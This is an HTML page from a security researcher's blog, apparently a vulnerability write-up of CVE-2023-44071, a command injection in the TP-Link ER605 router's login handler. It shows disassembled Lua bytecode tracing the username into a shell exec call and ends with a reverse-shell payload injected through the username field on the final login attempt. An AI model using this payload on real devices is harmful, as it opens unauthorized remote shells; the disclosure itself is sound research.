@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Zhiyuan">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/01/17/er605/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TP-Link ER605 Command injection">
+<meta property="og:url" content="http://example.com/2024/01/17/ER605/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2024-01-17T06:19:36.000Z">
+<meta property="article:modified_time" content="2025-05-17T06:25:21.873Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="IoT">
+<meta property="article:tag" content="Vulnerability">
+<meta property="article:tag" content="TP-Link">
+<meta property="article:tag" content="Pwn2Own">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/log2.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/log2.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/log2.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            TP-Link ER605 Command injection | Zhi0Yuan Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/drak.png"},"title":"兴趣是坚持和耐心的源泉","subtitle":{"text":["Zhi0Yuan","独立安全研究员","Never Fade Away"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Zhi0Yuan","instagram":null,"zhihu":null,"twitter":"https://x.com/Zeroved0x5A","email":"czhi540@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/log.jpg" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Zhi0Yuan Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">TP-Link ER605 Command injection</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/log.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Zhiyuan</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-01-17 14:19:36</span>
+        <span class="mobile">2024-01-17 14:19:36</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-05-17 14:25:21</span>
+            <span class="mobile">2025-05-17 14:25:21</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/My-Vulnerability/">My Vulnerability</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/IoT/">IoT</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Vulnerability/">Vulnerability</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/TP-Link/">TP-Link</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Pwn2Own/">Pwn2Own</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>这是我写这个漏洞文章的第二版，发现漏洞的契机是在去年的PWN2OWN TORONTO 2023这个设备是比赛的目标设备，在比赛的固件中已修复了该问题，让我们来简单的看一下这个漏洞吧。</p>
+</blockquote>
+<h2 id="分配的CVE"><a href="#分配的CVE" class="headerlink" title="分配的CVE"></a>分配的CVE</h2><blockquote>
+<p>CVE-2023-44071</p>
+</blockquote>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote>
+<p>ER605(UN)_V1_1.3.0 Build 20230511, ER605(UN)_V2_2.1.2 Build 20230210</p>
+</blockquote>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><blockquote>
+<p>下载存在漏洞的版本，直接使用unblob提取固件</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/EDR605/unblob.png"
+                      alt="img"
+                ></p>
+<blockquote>
+<p>查看文件系统就是openwrt，所以直接定位luci去进行代码审计通过，通过搜索危险函数定位到，&#x2F;usr&#x2F;lib&#x2F;lua&#x2F;luci&#x2F;controller&#x2F;login.lua 在登录的lua文件中居然存在exec函数，在luci中luci.sys.exec是用来执行系统命令的。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/EDR605/exec.png"
+                      alt="img"
+                ></p>
+<blockquote>
+<p>当然真实情况是我将编译的lua文件进行反编译后在vscode中找危险函数始终没有进展(因为反编译工具始终没有正确识别exec函数)，后面直接使用grep去搜索危险函数才发现login中存在exec</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/EDR605/compile.png"
+                      alt="img"
+                ></p>
+<blockquote>
+<p>由于反编译的代码中并没有成功识别exec函数我只能够使用<code>luadec -dis</code>反汇编所以下面的都是汇编代码，阅读起来一点麻烦。定位到exec函数</p>
+</blockquote>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">       ...</span><br><span class="line">180 [-]: GETGLOBAL R20 K16      ; R20 := string</span><br><span class="line">181 [-]: GETTABLE  R20 R20 K54  ; R20 := R20[&quot;format&quot;]</span><br><span class="line">182 [-]: LOADK     R21 K55      ; R21 := &quot;ubus call ievent addx \&#x27;&#123;\&quot;module\&quot;:\&quot;%s\&quot;,\&quot;eid\&quot;:\&quot;%s\&quot;,\&quot;errcode\&quot;:\&quot;%s\&quot;,\&quot;attrs\&quot;:\&quot;&#123;\\\&quot;userName\\\&quot;:\\\&quot;%s\\\&quot;,\\\&quot;loginType\\\&quot;:%d,\\\&quot;userIP\\\&quot;:\\\&quot;%s\\\&quot;,\\\&quot;retryCnt\\\&quot;:%d&#125;\&quot;&#125;\&#x27;&quot;</span><br><span class="line">183 [-]: GETUPVAL  R22 U11      ; R22 := U11</span><br><span class="line">184 [-]: GETUPVAL  R23 U12      ; R23 := U12</span><br><span class="line">185 [-]: GETUPVAL  R24 U13      ; R24 := U13</span><br><span class="line">186 [-]: MOVE      R25 R7       ; R25 := R7</span><br><span class="line">187 [-]: GETUPVAL  R26 U14      ; R26 := U14</span><br><span class="line">188 [-]: MOVE      R27 R9       ; R27 := R9</span><br><span class="line">189 [-]: GETTABLE  R28 R18 K42  ; R28 := R18[&quot;attempts&quot;]</span><br><span class="line">190 [-]: CALL      R20 9 2      ; R20 := R20(R21 to R28)</span><br><span class="line">191 [-]: GETTABLE  R21 R3 K56   ; R21 := R3[&quot;exec&quot;]</span><br><span class="line">192 [-]: MOVE      R22 R20      ; R22 := R20</span><br><span class="line">193 [-]: CALL      R21 2 1      ;  := R21(R22) //这里存在可能的 command injection</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>可以看到在181行中使用了string.format字符串格式化函数，推测使用string.format格式化<code>&quot;ubus call ievent addx \&#39;&#123;\&quot;module\&quot;:\&quot;%s\&quot;,\&quot;eid\&quot;:\&quot;%s\&quot;,\&quot;errcode\&quot;:\&quot;%s\&quot;,\&quot;attrs\&quot;:\&quot;&#123;\\\&quot;userName\\\&quot;:\\\&quot;%s\\\&quot;,\\\&quot;loginType\\\&quot;:%d,\\\&quot;userIP\\\&quot;:\\\&quot;%s\\\&quot;,\\\&quot;retryCnt\\\&quot;:%d&#125;\&quot;&#125;\&#39;&quot;</code> 可以看到其中的userName可能可以控制，寻找如何接收username?</p>
+</blockquote>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> 0 [-]: NEWTABLE  R1 0 0       ; R1 := &#123;&#125; (size = 0,0)</span><br><span class="line"> 1 [-]: GETGLOBAL R2 K0        ; R2 := require</span><br><span class="line"> 2 [-]: LOADK     R3 K1        ; R3 := &quot;luci.sauth&quot;</span><br><span class="line"> 3 [-]: CALL      R2 2 2       ; R2 := R2(R3)</span><br><span class="line"> 4 [-]: GETGLOBAL R3 K0        ; R3 := require</span><br><span class="line"> 5 [-]: LOADK     R4 K2        ; R4 := &quot;luci.sys&quot;</span><br><span class="line"> 6 [-]: CALL      R3 2 2       ; R3 := R3(R4)</span><br><span class="line"> 7 [-]: GETGLOBAL R4 K0        ; R4 := require</span><br><span class="line"> 8 [-]: LOADK     R5 K3        ; R5 := &quot;luci.model.checktypes&quot;</span><br><span class="line"> 9 [-]: CALL      R4 2 2       ; R4 := R4(R5)</span><br><span class="line">10 [-]: GETUPVAL  R5 U0        ; R5 := U0</span><br><span class="line">11 [-]: GETTABLE  R5 R5 K4     ; R5 := R5[&quot;decode&quot;]</span><br><span class="line">12 [-]: GETTABLE  R6 R0 K5     ; R6 := R0[&quot;data&quot;]</span><br><span class="line">13 [-]: CALL      R5 2 2       ; R5 := R5(R6)</span><br><span class="line">14 [-]: GETTABLE  R6 R5 K6     ; R6 := R5[&quot;params&quot;]</span><br><span class="line">15 [-]: GETTABLE  R7 R6 K7     ; R7 := R6[&quot;username&quot;] //获取username的值，存放在R7中</span><br><span class="line">16 [-]: GETTABLE  R8 R6 K8     ; R8 := R6[&quot;password&quot;]</span><br><span class="line">17 [-]: GETTABLE  R9 R3 K9     ; R9 := R3[&quot;getenv&quot;]</span><br><span class="line">18 [-]: LOADK     R10 K10      ; R10 := &quot;REMOTE_ADDR&quot;</span><br><span class="line">19 [-]: CALL      R9 2 2       ; R9 := R9(R10)</span><br><span class="line">20 [-]: LOADNIL   R10 R10      ; R10 := nil</span><br><span class="line">21 [-]: GETTABLE  R11 R4 K11   ; R11 := R4[&quot;check_ip_in_lan&quot;]</span><br><span class="line">22 [-]: MOVE      R12 R9       ; R12 := R9</span><br><span class="line">23 [-]: CALL      R11 2 2      ; R11 := R11(R12)</span><br><span class="line">24 [-]: NOT       R11 R11      ; R11 := not R11</span><br><span class="line">25 [-]: LOADNIL   R12 R12      ; R12 := nil</span><br><span class="line">             ...</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>在15行使用require接收username，存放到R7中。而正好在186行使用了R7。现在可以推测我们只需要在登录的时候更改username为shell command就可以注入了吗?</p>
+</blockquote>
+<blockquote>
+<p>当然我们失败了，但是为什么难道这个username是从别的地方来的吗？向前查看代码我发现了一些判断！</p>
+</blockquote>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">       ...</span><br><span class="line">176 [-]: GETTABLE  R20 R18 K42  ; R20 := R18[&quot;attempts&quot;]</span><br><span class="line">177 [-]: GETUPVAL  R21 U4       ; R21 := U4</span><br><span class="line">178 [-]: EQ        0 R20 R21    ; if R20 == R21 then goto 180 else goto 194</span><br><span class="line">179 [-]: JMP       14           ; PC += 14 (goto 194)</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure></div>
+<blockquote>
+<p>当R20等于R21时我们将jmp到180，也就是执行exec的地方，所以这是什么东西呢?</p>
+</blockquote>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">157 [-]: GETUPVAL  R20 U4       ; R20 := U4</span><br><span class="line">158 [-]: GETTABLE  R21 R18 K42  ; R21 := R18[&quot;attempts&quot;]</span><br><span class="line">159 [-]: SUB       R20 R20 R21  ; R20 := R20 - R21 </span><br><span class="line">160 [-]: SETTABLE  R1 K45 R20   ; R1[&quot;attemptsAllowed&quot;] := R20</span><br><span class="line">161 [-]: TEST      R11 0        ; if R11 then goto 163 else goto 170</span><br><span class="line">162 [-]: JMP       7            ; PC += 7 (goto 170)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>继续向前面查看可以看到在158行也对R20和R21执行了什么操作，在下面可以看到attemptsAllowed，那么会不会是允许登录的次数，因为在测试登录时系统会提醒还有多少次尝试登录的机会。</p>
+</blockquote>
+<blockquote>
+<p>没错我们赌赢了✌️！确实是这样的，当我们尝试登录到第十次，也就是最后一次机会时将用户名更改为shellcommand。我们将会获取一个漂亮的shell🫡！</p>
+</blockquote>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;`rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet ip port &gt; f`&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Vido"><a href="#Vido" class="headerlink" title="Vido"></a>Vido</h2><p><a class="link"   target="_blank" rel="noopener" href="https://drive.google.com/file/d/1bXSqmImmRc7TIJ8HjFDIc1s0EDJuQpEz/view?usp=sharing" >https://drive.google.com/file/d/1bXSqmImmRc7TIJ8HjFDIc1s0EDJuQpEz/view?usp=sharing<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> TP-Link ER605 Command injection</li>
+        <li><strong>Author:</strong> Zhiyuan</li>
+        <li><strong>Created at
+                :</strong> 2024-01-17 14:19:36</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-05-17 14:25:21
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/01/17/ER605/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/IoT/">#IoT</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Vulnerability/">#Vulnerability</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/TP-Link/">#TP-Link</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Pwn2Own/">#Pwn2Own</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2024/02/06/hillstonenet/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">山石网科云鉴存在前台任意命令执行漏洞</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2023/06/28/CVE-2020-10882/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">CVE-2020-10882 tdpServer服务分析</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">TP-Link ER605 Command injection</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E9%85%8D%E7%9A%84CVE"><span class="nav-text">分配的CVE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vido"><span class="nav-text">Vido</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Zhiyuan</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        6 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
